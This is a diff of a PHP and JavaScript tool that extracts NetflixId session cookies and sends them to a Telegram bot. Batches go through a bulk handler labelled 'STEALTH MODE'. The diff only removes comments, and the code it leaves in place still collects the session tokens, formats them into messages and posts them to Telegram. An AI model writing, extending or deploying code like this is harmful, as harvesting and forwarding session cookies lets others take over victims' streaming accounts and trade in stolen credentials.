@@ -17,7 +17,7 @@ function extractNetflixId($cookie) {
 
     return "N/A";
 }
-//SEND TO TELEGRAM
+
 function sendToTelegram($text) {
     $botToken = getenv('TG_BOT_TOKEN');
     $chatId = getenv('TG_CHAT_ID');
@@ -49,7 +49,7 @@ function sendToTelegram($text) {
     return $response;
 }
 
-/* ✅ ADD THIS FUNCTION RIGHT HERE */
+
 function sendBulkFile($text) {
     $botToken = getenv('TG_BOT_TOKEN');
     $chatId = getenv('TG_CHAT_ID');
@@ -87,7 +87,7 @@ function sendBulkFile($text) {
 }
 $bulkResults = [];
 
-// ✅ HANDLE BULK SEND (STEALTH MODE)
+
 $raw = file_get_contents('php://input');
 $data = json_decode($raw, true);
 
@@ -161,8 +161,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 "🍪 NetflixId={$netflixId}\n" .
 "━━━━━━━━━━━━━━━━━━━━";
 
-        // 🔥 FIX: send immediately (no bulk bug)
-        //sendToTelegram($msg); // 🔥 instant send
+        
         $bulkResults[] = $msg;
     }
 
@@ -1808,7 +1807,7 @@ exportData.push(
         document.getElementById('btnProgressText').textContent = 'Processing...';
         }, 1200);
         unlockInputs(); // 🔓 UNLOCK UI
-    // 🔥 SEND BULK TO BACKEND (ADD THIS HERE)
+
      if (exportData.length > 0) {
         fetch(window.location.href, {
         method: "POST",
